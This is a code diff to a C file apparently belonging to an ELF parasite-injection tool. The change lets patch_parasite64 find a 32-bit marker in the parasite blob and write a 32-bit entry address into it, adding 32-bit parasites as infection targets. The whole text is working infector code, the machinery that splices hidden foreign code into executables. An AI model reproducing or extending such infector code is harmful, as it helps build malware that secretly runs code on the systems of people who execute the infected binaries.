@@ -1,5 +1,8 @@
 #include <elfit.h>
 
+#define X64 1
+#define X32 2
+
 #define X86_64_POLYKEY_IND (14 + 8)
 #define X86_64_SIZE_IND    (25 + 8)
 
@@ -44,6 +47,7 @@ int patch_parasite32(Elfit_t *parasite, uint32_t patchpos, uint32_t vaddr)
 
 int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
 {
+    int arch = X64;
     int i;
 
     if (patchpos==0)
@@ -53,6 +57,20 @@ int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
         {
             if (!strcmp(&parasite->mem[i], "\x77\x66\x55\x44\x33\x22\x11"))
             {
+                patchpos = i;
+                break;
+            }
+        }
+    }
+
+    /* possible we are trying to patch into a 32bit parasite */
+    if (patchpos==0)
+    {
+        for (i=0;i<parasite->file->st_size;i++)
+        {
+            if (!strcmp(&parasite->mem[i], "\x33\x22\x11"))
+            {
+                arch = X32;
                 patchpos = i;
                 break;
             }
@@ -70,7 +88,14 @@ int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
 
     if (patchpos >= parasite->file->st_size)
         return -1;
-    *(uint64_t *)&parasite->mem[patchpos] = vaddr;
+
+    if (arch == X64)
+        *(uint64_t *)&parasite->mem[patchpos] = vaddr;
+    else if (arch == X32)
+    {
+        printf("[!] performing patch on 32bit parasite\n");
+        *(uint32_t *)&parasite->mem[patchpos] = vaddr;
+    }
 
     return 0;
 }
